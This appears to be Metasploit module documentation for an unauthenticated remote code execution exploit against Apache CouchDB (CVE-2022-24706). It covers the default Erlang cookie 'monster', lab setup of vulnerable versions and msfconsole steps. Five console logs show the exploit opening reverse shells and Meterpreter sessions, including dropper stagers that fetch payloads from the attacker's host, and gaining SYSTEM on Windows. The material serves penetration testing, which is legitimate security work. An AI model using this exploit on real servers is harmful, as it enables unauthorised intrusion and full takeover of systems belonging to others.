## Vulnerable Application
### Description
This module exploits CVE-2022-24706, an unauthenticated RCE vulnerability in Apache CouchDB in versions 3.2.1 and below.

Apache CouchDB is written in Erlang and so it has built-in support for distributed computing (clustering). The
cluster nodes communicate using the Erlang/OTP Distribution Protocol, which provides for the possibility of executing
OS command requests as the user running the software.

In order to connect and run OS commands, one needs to know the secret phrase or in Erlang terms the "cookie". The CouchDB
installer in versions 3.2.1 and below, by default, sets the cookie to "monster".

### Setup
#### Ubuntu 20.04
Create a CouchDB user:
```
sudo adduser --system \
             --home /opt/couchdb \
             --no-create-home \
             --shell /bin/bash \
             --group --gecos \
             "CouchDB Administrator" couchdb
sudo passwd couchdb
```

Install dependencies:
```
sudo apt-get --no-install-recommends -y install \
    build-essential pkg-config erlang erlang-reltool \
    libicu-dev libmozjs-68-dev python3
sudo apt-get -y install pip sphinx-doc sphinx-common
sudo pip install --upgrade sphinx_rtd_theme nose requests hypothesis
```

Download vulnerable version of CouchDB:
```
wget https://downloads.apache.org/couchdb/source/3.2.1/apache-couchdb-3.2.1.tar.gz
gunzip apache-couchdb-3.2.1.tar.gz
tar -xvf apache-couchdb-3.2.1.tar
```

Copy the built couchdb release to the new user's home directory:
`cp -R /path/to/couchdb/rel/couchdb /opt/couchdb`

Change the ownership & permission of the CouchDB directories by running:
```
chown -R couchdb:couchdb /opt/couchdb
find /opt/couchdb -type d -exec chmod 0770 {} \;
```

Update the permissions for the ini files:
`chmod 0644 /opt/couchdb/etc/*`

Change the bind address of `[chttpd]` and `[httpd]` in `</path/to/couchdb/>/etc/default.ini` from 127.0.0.1 to 0.0.0.0 or
or whatever you prefer.
```
[httpd]
port = 5986
bind_address = 0.0.0.0
[chttpd]
; These settings affect the main, clustered port (5984 by default).
port = 5984
bind_address = 0.0.0.0
```

You can start the CouchDB server by running:
`sudo -i -u couchdb couchdb/bin/couchdb`

Navigate to `http://<IP-ADDRESS>:5984/_utils/` to verify the install

#### Windows

Download the following installer:
`https://archive.apache.org/dist/couchdb/binary/win/2.3.1/apache-couchdb-2.3.1.msi`

Click the installer to launch, accept the licensing agreement. CouchDB should now be installed.

Change the bind address of `[chttpd]` and `[httpd]` in `</path/to/couchdb/>etc/default.ini` from 127.0.0.1 to 0.0.0.0 or
or whatever you prefer
```
[httpd]
port = 5986
bind_address = 0.0.0.0
[chttpd]
; These settings affect the main, clustered port (5984 by default).
port = 5984
bind_address = 0.0.0.0
```
Restart the `Apache CouchDB` service: `net stop "Apache CouchDB"` and then `net start "Apache CouchDB"` in an administrative console.
Then navigate to `http://<IP-ADDRESS>:5984/_utils/` to verify that the install completed successfully. You should see a page with
`Databases` at the top of the screen and a navigation bar to the left of the screen if all goes well.

## Verification Steps

1. Start msfconsole
1. Do: `use exploit/multi/http/apache_couchdb_erlang_rce`
1. Set the `RHOST` and `LHOST` values
1. `exploit`
1. Verify: That you receive a session as the user that is running the ApacheDB application.

## Scenarios
### Unix Command, Ubuntu 20.04, Apache CouchDB 3.2.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse double SSL handler on 172.16.199.1:4444
[*] 172.16.199.164:4369 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.199.164:4369 - Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: 172.16.199.164:4369...
[*] 172.16.199.164:4369 - Successfully found EDPM socket
[*] 172.16.199.164:4369 - Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...
[*] 172.16.199.164:4369 - Connection successful
[*] 172.16.199.164:4369 - Erlang challenge and response completed successfully
[+] 172.16.199.164:4369 - The target is vulnerable. Successfully connected to the Erlang Server with cookie: "monster"
[*] 172.16.199.164:4369 - sending payload...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo t82KLKYvcDd54em2;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "t82KLKYvcDd54em2\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.16.199.1:4443 -> 172.16.199.164:53778) at 2022-10-13 14:09:49 -0400

id
uid=128(couchdb) gid=134(couchdb) groups=134(couchdb)
uname -a
Linux ubuntu 5.15.0-50-generic #56~20.04.1-Ubuntu SMP Tue Sep 27 15:51:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

### Linux Dropper, Ubuntu 20.04, Apache CouchDB 3.2.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.164:4369 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.199.164:4369 - Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: 172.16.199.164:4369...
[*] 172.16.199.164:4369 - Successfully found EDPM socket
[*] 172.16.199.164:4369 - Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...
[*] 172.16.199.164:4369 - Connection successful
[*] 172.16.199.164:4369 - Erlang challenge and response completed successfully
[+] 172.16.199.164:4369 - The target is vulnerable. Successfully connected to the Erlang Server with cookie: "monster"
[*] 172.16.199.164:4369 - Using URL: http://172.16.199.1:8080/xiNdbG3
[*] 172.16.199.164:4369 - sending payload...
[*] 172.16.199.164:4369 - Client 172.16.199.164 (Wget/1.20.3 (linux-gnu)) requested /xiNdbG3
[*] 172.16.199.164:4369 - Sending payload to 172.16.199.164 (Wget/1.20.3 (linux-gnu))
[*] Meterpreter session 10 opened (172.16.199.1:4444 -> 172.16.199.164:57710) at 2022-10-17 18:33:57 -0400
[*] 172.16.199.164:4369 - Command Stager progress - 100.00% done (112/112 bytes)
[*] 172.16.199.164:4369 - Server stopped.

meterpreter > getuid
Server username: couchdb
meterpreter > sysinfo
Computer     : 172.16.199.164
OS           : Ubuntu 20.04 (Linux 5.15.0-50-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
```

### Windows Command, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: 172.16.199.137:4369...
[*] 172.16.199.137:4369 - Successfully found EDPM socket
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...
[*] 172.16.199.137:4369 - Connection successful
[*] 172.16.199.137:4369 - Erlang challenge and response completed successfully
[+] 172.16.199.137:4369 - The target is vulnerable. Successfully connected to the Erlang Server with cookie: "monster"
[*] 172.16.199.137:4369 - sending payload...
[*] Powershell session session 11 opened (172.16.199.1:4444 -> 172.16.199.137:49762) at 2022-10-17 18:44:16 -0400


Shell Banner:
Windows PowerShell running as user DESKTOP-8ATHH6O$ on DESKTOP-8ATHH6O
Copyright (C) Microsoft Corporation. All rights reserved.
-----

PS C:\CouchDB> whoami
nt authority\system
PS C:\CouchDB> systeminfo

Host Name:                 DESKTOP-8ATHH6O
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
...
PS C:\CouchDB>
```

### Windows Dropper, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: 172.16.199.137:4369...
[*] 172.16.199.137:4369 - Successfully found EDPM socket
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...
[*] 172.16.199.137:4369 - Connection successful
[*] 172.16.199.137:4369 - Erlang challenge and response completed successfully
[+] 172.16.199.137:4369 - The target is vulnerable. Successfully connected to the Erlang Server with cookie: "monster"
[*] 172.16.199.137:4369 - sending payload...
...
[*] 172.16.199.137:4369 - Command Stager progress -  99.41% done (306900/308720 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] Meterpreter session 5 opened (172.16.199.1:4444 -> 172.16.199.137:49749) at 2022-10-14 17:09:31 -0400
[*] 172.16.199.137:4369 - Command Stager progress - 100.00% done (308720/308720 bytes)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### PowerShell Stager, Windows 10, Apache CouchDB 2.3.1
```
msf6 exploit(multi/http/apache_couchdb_erlang_rce) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 172.16.199.137:4369 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Port Mapper Daemon (EDPM) socket at: 172.16.199.137:4369...
[*] 172.16.199.137:4369 - Successfully found EDPM socket
[*] 172.16.199.137:4369 - Attempting to connect to the Erlang Server with an Erlang Server Cookie value of "monster" (default in vulnerable instances of Apache CouchDB)...
[*] 172.16.199.137:4369 - Connection successful
[*] 172.16.199.137:4369 - Erlang challenge and response completed successfully
[+] 172.16.199.137:4369 - The target is vulnerable. Successfully connected to the Erlang Server with cookie: "monster"
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  20.94% done (2046/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  41.88% done (4092/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  62.82% done (6138/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] 172.16.199.137:4369 - Command Stager progress -  83.77% done (8184/9770 bytes)
[*] 172.16.199.137:4369 - sending payload...
[*] Sending stage (222278 bytes) to 172.16.199.137
[*] Meterpreter session 12 opened (172.16.199.1:4444 -> 172.16.199.137:49773) at 2022-10-17 18:45:56 -0400
[*] 172.16.199.137:4369 - Command Stager progress - 100.00% done (9770/9770 bytes)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
